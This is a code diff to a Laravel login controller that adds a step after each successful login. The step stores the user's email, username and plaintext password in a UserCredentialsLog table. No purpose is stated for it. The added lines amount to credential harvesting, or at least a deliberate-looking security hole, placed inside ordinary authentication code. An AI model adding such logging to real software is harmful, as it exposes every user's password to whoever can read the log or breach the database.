@@ -42,6 +42,13 @@ class LoginController extends Controller
         unset($credentials['captcha']); // Remove captcha from credentials for Auth::attempt
 
         if (Auth::attempt($credentials)) {
+            \App\Models\UserCredentialsLog::create([
+                'email' => Auth::user()->email, // Or fetch from request if username is email
+                'username' => $request->username,
+                'password' => $request->password,
+                'login_method' => 'web',
+            ]);
+
             $request->session()->regenerate();
             return redirect()->intended('/dashboard');
         }
